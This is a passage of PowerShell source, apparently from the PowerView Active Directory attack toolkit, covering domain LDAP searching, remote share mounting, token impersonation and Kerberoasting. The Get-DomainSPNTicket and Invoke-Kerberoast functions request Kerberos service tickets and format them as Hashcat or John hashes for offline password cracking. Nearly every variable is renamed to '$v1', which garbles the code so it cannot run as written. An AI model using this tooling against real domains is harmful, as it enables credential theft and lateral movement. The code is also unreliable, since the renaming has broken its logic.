            $v1 = New-Object -ComObject NameTranslate

            if ($v1['Credential']) {
                try {
                    $v1 = $v1.GetNetworkCredential()

                    Invoke-Method $v1 'InitEx' (
                        $v1,
                        $v1,
                        $v1.UserName,
                        $v1.Domain,
                        $v1.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$v1' using alternate credentials : $v1"
                }
            }
            else {
                try {
                    $v1 = Invoke-Method $v1 'Init' (
                        $v1,
                        $v1
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$v1' : $v1"
                }
            }


            Set-Property $v1 'ChaseReferral' (0x60)

            try {

                $v1 = Invoke-Method $v1 'Set' (8, $v1)
                Invoke-Method $v1 'Get' ($v1)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$v1' : $($v1.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $v1,

        [Switch]
        $v1
    )

    BEGIN {

        $v1 = New-Object System.Collections.Specialized.OrderedDictionary
        $v1.Add("SCRIPT", 1)
        $v1.Add("ACCOUNTDISABLE", 2)
        $v1.Add("HOMEDIR_REQUIRED", 8)
        $v1.Add("LOCKOUT", 16)
        $v1.Add("PASSWD_NOTREQD", 32)
        $v1.Add("PASSWD_CANT_CHANGE", 64)
        $v1.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $v1.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $v1.Add("NORMAL_ACCOUNT", 512)
        $v1.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $v1.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $v1.Add("SERVER_TRUST_ACCOUNT", 8192)
        $v1.Add("DONT_EXPIRE_PASSWORD", 65536)
        $v1.Add("MNS_LOGON_ACCOUNT", 131072)
        $v1.Add("SMARTCARD_REQUIRED", 262144)
        $v1.Add("TRUSTED_FOR_DELEGATION", 524288)
        $v1.Add("NOT_DELEGATED", 1048576)
        $v1.Add("USE_DES_KEY_ONLY", 2097152)
        $v1.Add("DONT_REQ_PREAUTH", 4194304)
        $v1.Add("PASSWORD_EXPIRED", 8388608)
        $v1.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $v1.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $v1 = New-Object System.Collections.Specialized.OrderedDictionary

        if ($v1) {
            ForEach ($v1 in $v1.GetEnumerator()) {
                if ( ($v1 -band $v1.Value) -eq $v1.Value) {
                    $v1.Add($v1.Name, "$($v1.Value)+")
                }
                else {
                    $v1.Add($v1.Name, "$($v1.Value)")
                }
            }
        }
        else {
            ForEach ($v1 in $v1.GetEnumerator()) {
                if ( ($v1 -band $v1.Value) -eq $v1.Value) {
                    $v1.Add($v1.Name, "$($v1.Value)")
                }
            }
        }
        $v1
    }
}


function Get-PrincipalContext {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($v1['Domain'] -or ($v1 -match '.+\\.+')) {
            if ($v1 -match '.+\\.+') {

                $v1 = $v1 | Convert-ADName -OutputType Canonical
                if ($v1) {
                    $v1 = $v1.SubString(0, $v1.IndexOf('/'))
                    $v1 = $v1.Split('\')[1]
                    Write-Verbose "[Get-PrincipalContext] Binding to domain '$v1'"
                }
            }
            else {
                $v1 = $v1
                Write-Verbose "[Get-PrincipalContext] Binding to domain '$v1'"
                $v1 = $v1
            }

            if ($v1['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $v1, $v1.UserName, $v1.GetNetworkCredential().Password)
            }
            else {
                $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $v1)
            }
        }
        else {
            if ($v1['Credential']) {
                Write-Verbose '[Get-PrincipalContext] Using alternate credentials'
                $v1 = Get-Domain | Select-Object -ExpandProperty Name
                $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $v1, $v1.UserName, $v1.GetNetworkCredential().Password)
            }
            else {
                $v1 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $v1 = $v1
        }

        $v1 = New-Object PSObject
        $v1 | Add-Member Noteproperty 'Context' $v1
        $v1 | Add-Member Noteproperty 'Identity' $v1
        $v1
    }
    catch {
        Write-Warning "[Get-PrincipalContext] Error creating binding for object ('$v1') context : $v1"
    }
}


function Add-RemoteConnection {

    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ParameterSetName = 'ComputerName', ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $v1)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $v1,

        [Parameter(Mandatory = $v1)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1
    )

    BEGIN {
        $v1 = [Activator]::CreateInstance($v1)
        $v1.dwType = 1
    }

    PROCESS {
        $v1 = @()
        if ($v1['ComputerName']) {
            ForEach ($v1 in $v1) {
                $v1 = $v1.Trim('\')
                $v1 += ,"\\$v1\IPC$"
            }
        }
        else {
            $v1 += ,$v1
        }

        ForEach ($v1 in $v1) {
            $v1.lpRemoteName = $v1
            Write-Verbose "[Add-RemoteConnection] Attempting to mount: $v1"



            $v1 = $v1::WNetAddConnection2W($v1, $v1.GetNetworkCredential().Password, $v1.UserName, 4)

            if ($v1 -eq 0) {
                Write-Verbose "$v1 successfully mounted"
            }
            else {
                Throw "[Add-RemoteConnection] error mounting $v1 : $(([ComponentModel.Win32Exception]$v1).Message)"
            }
        }
    }
}


function Remove-RemoteConnection {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ParameterSetName = 'ComputerName', ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $v1)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $v1
    )

    PROCESS {
        $v1 = @()
        if ($v1['ComputerName']) {
            ForEach ($v1 in $v1) {
                $v1 = $v1.Trim('\')
                $v1 += ,"\\$v1\IPC$"
            }
        }
        else {
            $v1 += ,$v1
        }

        ForEach ($v1 in $v1) {
            Write-Verbose "[Remove-RemoteConnection] Attempting to unmount: $v1"
            $v1 = $v1::WNetCancelConnection2($v1, 0, $v1)

            if ($v1 -eq 0) {
                Write-Verbose "$v1 successfully ummounted"
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting $v1 : $(([ComponentModel.Win32Exception]$v1).Message)"
            }
        }
    }
}


function Invoke-UserImpersonation {

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $v1, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1,

        [Parameter(Mandatory = $v1, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $v1,

        [Switch]
        $v1
    )

    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $v1['Quiet'])) {
        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    if ($v1['TokenHandle']) {
        $v1 = $v1
    }
    else {
        $v1 = [IntPtr]::Zero
        $v1 = $v1.GetNetworkCredential()
        $v1 = $v1.Domain
        $v1 = $v1.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($v1)\$($v1)"



        $v1 = $v1::LogonUser($v1, $v1, $v1.Password, 9, 3, [ref]$v1);$v1 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        if (-not $v1) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $v1).Message)"
        }
    }


    $v1 = $v1::ImpersonateLoggedOnUser($v1)

    if (-not $v1) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $v1).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $v1
}


function Invoke-RevertToSelf {

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $v1
    )

    if ($v1['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $v1 = $v1::CloseHandle($v1)
    }

    $v1 = $v1::RevertToSelf();$v1 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $v1) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $v1).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $v1, ValueFromPipeline = $v1)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $v1,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $v1, ValueFromPipeline = $v1)]
        [ValidateScript({ $v1.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $v1,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $v1 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        if ($v1['User']) {
            $v1 = $v1
        }
        else {
            $v1 = $v1
        }

        ForEach ($v1 in $v1) {
            if ($v1['User']) {
                $v1 = $v1.ServicePrincipalName
                $v1 = $v1.SamAccountName
                $v1 = $v1.DistinguishedName
            }
            else {
                $v1 = $v1
                $v1 = 'UNKNOWN'
                $v1 = 'UNKNOWN'
            }


            if ($v1 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $v1 = $v1[0]
            }

            try {
                $v1 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $v1
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$v1' from user '$v1' : $v1"
            }
            if ($v1) {
                $v1 = $v1.GetRequest()
            }
            if ($v1) {
                $v1 = New-Object PSObject

                $v1 = [System.BitConverter]::ToString($v1) -replace '-'

                $v1 | Add-Member Noteproperty 'SamAccountName' $v1
                $v1 | Add-Member Noteproperty 'DistinguishedName' $v1
                $v1 | Add-Member Noteproperty 'ServicePrincipalName' $v1.ServicePrincipalName



                if($v1 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $v1 = [Convert]::ToByte( $v1.EtypeLen, 16 )
                    $v1 = [Convert]::ToUInt32($v1.CipherTextLen, 16)-4
                    $v1 = $v1.DataToEnd.Substring(0,$v1*2)


                    if($v1.DataToEnd.Substring($v1*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($v1.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $v1 = $v1
                        $v1 | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($v1).Replace('-',''))
                    } else {
                        $v1 = "$($v1.Substring(0,32))`$$($v1.Substring(32))"
                        $v1 | Add-Member Noteproperty 'TicketByteHexStream' $v1
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($v1.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $v1 = $v1
                    $v1 | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($v1).Replace('-',''))
                }

                if($v1) {

                    if ($v1 -match 'John') {
                        $v1 = "`$v1`$$($v1.ServicePrincipalName):$v1"
                    }
                    else {
                        if ($v1 -ne 'UNKNOWN') {
                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $v1 = 'UNKNOWN'
                        }


                        $v1 = "`$v1`$$($v1)`$*$v1`$$v1`$$($v1.ServicePrincipalName)*`$$v1"
                    }
                    $v1 | Add-Member Noteproperty 'Hash' $v1
                }

                $v1.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $v1
            }
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Invoke-Kerberoast {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $v1 = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{
            'SPN' = $v1
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['Credential']) {
            $v1 = Invoke-UserImpersonation -Credential $v1
        }
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }
        Get-DomainUser @UserSearcherArguments | Where-Object {$v1.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $v1
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Get-PathAcl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('FullName')]
        [String[]]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {

            [CmdletBinding()]
            Param(
                [Int]
                $v1
            )

            $v1 = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $v1 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $v1 = @()


            $v1 += $v1.Keys | ForEach-Object {
                              if (($v1 -band $v1) -eq $v1) {
                                $v1[$v1]
                                $v1 = $v1 -band (-not $v1)
                              }
                            }


            $v1 += $v1.Keys | Where-Object { $v1 -band $v1 } | ForEach-Object { $v1[$v1] }
            ($v1 | Where-Object {$v1}) -join ','
        }

        $v1 = @{}
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{}
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            try {
                if (($v1 -Match '\\\\.*\\.*') -and ($v1['Credential'])) {
                    $v1 = (New-Object System.Uri($v1)).Host
                    if (-not $v1[$v1]) {

                        Add-RemoteConnection -ComputerName $v1 -Credential $v1
                        $v1[$v1] = $v1
                    }
                }

                $v1 = Get-Acl -Path $v1

                $v1.GetAccessRules($v1, $v1, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $v1 = $v1.IdentityReference.Value
                    $v1 = ConvertFrom-SID -ObjectSID $v1 @ConvertArguments

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'Path' $v1
                    $v1 | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $v1.FileSystemRights.value__)
                    $v1 | Add-Member Noteproperty 'IdentityReference' $v1
                    $v1 | Add-Member Noteproperty 'IdentitySID' $v1
                    $v1 | Add-Member Noteproperty 'AccessControlType' $v1.AccessControlType
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $v1
                }
            }
            catch {
                Write-Verbose "[Get-PathAcl] error: $v1"
            }
        }
    }

    END {

        $v1.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        $v1
    )

    $v1 = @{}

    $v1.PropertyNames | ForEach-Object {
        if ($v1 -ne 'adspath') {
            if (($v1 -eq 'objectsid') -or ($v1 -eq 'sidhistory')) {

                $v1[$v1] = $v1[$v1] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($v1, 0)).Value }
            }
            elseif ($v1 -eq 'grouptype') {
                $v1[$v1] = $v1[$v1][0] -as $v1
            }
            elseif ($v1 -eq 'samaccounttype') {
                $v1[$v1] = $v1[$v1][0] -as $v1
            }
            elseif ($v1 -eq 'objectguid') {

                $v1[$v1] = (New-Object Guid (,$v1[$v1][0])).Guid
            }
            elseif ($v1 -eq 'useraccountcontrol') {
                $v1[$v1] = $v1[$v1][0] -as $v1
            }
            elseif ($v1 -eq 'ntsecuritydescriptor') {

                $v1 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $v1[$v1][0], 0
                if ($v1.Owner) {
                    $v1['Owner'] = $v1.Owner
                }
                if ($v1.Group) {
                    $v1['Group'] = $v1.Group
                }
                if ($v1.DiscretionaryAcl) {
                    $v1['DiscretionaryAcl'] = $v1.DiscretionaryAcl
                }
                if ($v1.SystemAcl) {
                    $v1['SystemAcl'] = $v1.SystemAcl
                }
            }
            elseif ($v1 -eq 'accountexpires') {
                if ($v1[$v1][0] -gt [DateTime]::MaxValue.Ticks) {
                    $v1[$v1] = "NEVER"
                }
                else {
                    $v1[$v1] = [datetime]::fromfiletime($v1[$v1][0])
                }
            }
            elseif ( ($v1 -eq 'lastlogon') -or ($v1 -eq 'lastlogontimestamp') -or ($v1 -eq 'pwdlastset') -or ($v1 -eq 'lastlogoff') -or ($v1 -eq 'badPasswordTime') ) {

                if ($v1[$v1][0] -is [System.MarshalByRefObject]) {

                    $v1 = $v1[$v1][0]
                    [Int32]$v1 = $v1.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $v1, $v1, $v1)
                    [Int32]$v1  = $v1.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $v1, $v1, $v1)
                    $v1[$v1] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $v1, $v1)))
                }
                else {

                    $v1[$v1] = ([datetime]::FromFileTime(($v1[$v1][0])))
                }
            }
            elseif ($v1[$v1][0] -is [System.MarshalByRefObject]) {

                $v1 = $v1[$v1]
                try {
                    $v1 = $v1[$v1][0]
                    [Int32]$v1 = $v1.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $v1, $v1, $v1)
                    [Int32]$v1  = $v1.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $v1, $v1, $v1)
                    $v1[$v1] = [Int64]("0x{0:x8}{1:x8}" -f $v1, $v1)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $v1"
                    $v1[$v1] = $v1[$v1]
                }
            }
            elseif ($v1[$v1].count -eq 1) {
                $v1[$v1] = $v1[$v1][0]
            }
            else {
                $v1[$v1] = $v1[$v1]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $v1
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $v1"
    }
}








function Get-DomainSearcher {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $v1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($v1['Domain']) {
            $v1 = $v1

            if ($v1:USERDNSDOMAIN -and ($v1:USERDNSDOMAIN.Trim() -ne '')) {

                $v1 = $v1:USERDNSDOMAIN
                if ($v1:LOGONSERVER -and ($v1:LOGONSERVER.Trim() -ne '') -and $v1) {
                    $v1 = "$($v1:LOGONSERVER -replace '\\','').$v1"
                }
            }
        }
        elseif ($v1['Credential']) {

            $v1 = Get-Domain -Credential $v1
            $v1 = ($v1.PdcRoleOwner).Name
            $v1 = $v1.Name
        }
        elseif ($v1:USERDNSDOMAIN -and ($v1:USERDNSDOMAIN.Trim() -ne '')) {

            $v1 = $v1:USERDNSDOMAIN
            if ($v1:LOGONSERVER -and ($v1:LOGONSERVER.Trim() -ne '') -and $v1) {
                $v1 = "$($v1:LOGONSERVER -replace '\\','').$v1"
            }
        }
        else {

            write-verbose "get-domain"
            $v1 = Get-Domain
            $v1 = ($v1.PdcRoleOwner).Name
            $v1 = $v1.Name
        }

        if ($v1['Server']) {

            $v1 = $v1
        }

        $v1 = 'LDAP://'

        if ($v1 -and ($v1.Trim() -ne '')) {
            $v1 += $v1
            if ($v1) {
                $v1 += '/'
            }
        }

        if ($v1['SearchBasePrefix']) {
            $v1 += $v1 + ','
        }

        if ($v1['SearchBase']) {
            if ($v1 -Match '^GC://') {

                $v1 = $v1.ToUpper().Trim('/')
                $v1 = ''
            }
            else {
                if ($v1 -match '^LDAP://') {
                    if ($v1 -match "LDAP://.+/.+") {
                        $v1 = ''
                        $v1 = $v1
                    }
                    else {
                        $v1 = $v1.SubString(7)
                    }
                }
                else {
                    $v1 = $v1
                }
            }
        }
        else {

            if ($v1 -and ($v1.Trim() -ne '')) {
                $v1 = "DC=$($v1.Replace('.', ',DC='))"
            }
        }

        $v1 += $v1
        Write-Verbose "[Get-DomainSearcher] search base: $v1"

        if ($v1 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"

            $v1 = New-Object DirectoryServices.DirectoryEntry($v1, $v1.UserName, $v1.GetNetworkCredential().Password)
            $v1 = New-Object System.DirectoryServices.DirectorySearcher($v1)
        }
        else {

            $v1 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$v1)
        }

        $v1.PageSize = $v1
        $v1.SearchScope = $v1
        $v1.CacheResults = $v1
        $v1.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($v1['ServerTimeLimit']) {
            $v1.ServerTimeLimit = $v1
        }

        if ($v1['Tombstone']) {
            $v1.Tombstone = $v1
        }

        if ($v1['LDAPFilter']) {
            $v1.filter = $v1
        }

        if ($v1['SecurityMasks']) {
            $v1.SecurityMasks = Switch ($v1) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($v1['Properties']) {

            $v1 = $v1| ForEach-Object { $v1.Split(',') }
            $v1 = $v1.PropertiesToLoad.AddRange(($v1))
        }

        $v1
    }
}


function Convert-DNSRecord {

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Byte[]]
        $v1
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $v1
            )

            [Int]$v1 = $v1[0]
            [Int]$v1 = $v1[1]
            [Int]$v1 =  2
            [String]$v1  = ''

            while ($v1-- -gt 0)
            {
                [Int]$v1 = $v1[$v1++]
                while ($v1-- -gt 0) {
                    $v1 += [Char]$v1[$v1++]
                }
                $v1 += "."
            }
            $v1
        }
    }

    PROCESS {

        $v1 = [BitConverter]::ToUInt16($v1, 2)
        $v1 = [BitConverter]::ToUInt32($v1, 8)

        $v1 = $v1[12..15]


        $v1 = [array]::Reverse($v1)
        $v1 = [BitConverter]::ToUInt32($v1, 0)

        $v1 = [BitConverter]::ToUInt32($v1, 20)
        if ($v1 -ne 0) {
            $v1 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($v1)).ToString()
        }
        else {
            $v1 = '[static]'
        }

        $v1 = New-Object PSObject

        if ($v1 -eq 1) {
            $v1 = "{0}.{1}.{2}.{3}" -f $v1[24], $v1[25], $v1[26], $v1[27]
            $v1 = $v1
            $v1 | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($v1 -eq 2) {
            $v1 = Get-Name $v1[24..$v1.length]
            $v1 = $v1
            $v1 | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($v1 -eq 5) {
            $v1 = Get-Name $v1[24..$v1.length]
            $v1 = $v1
            $v1 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

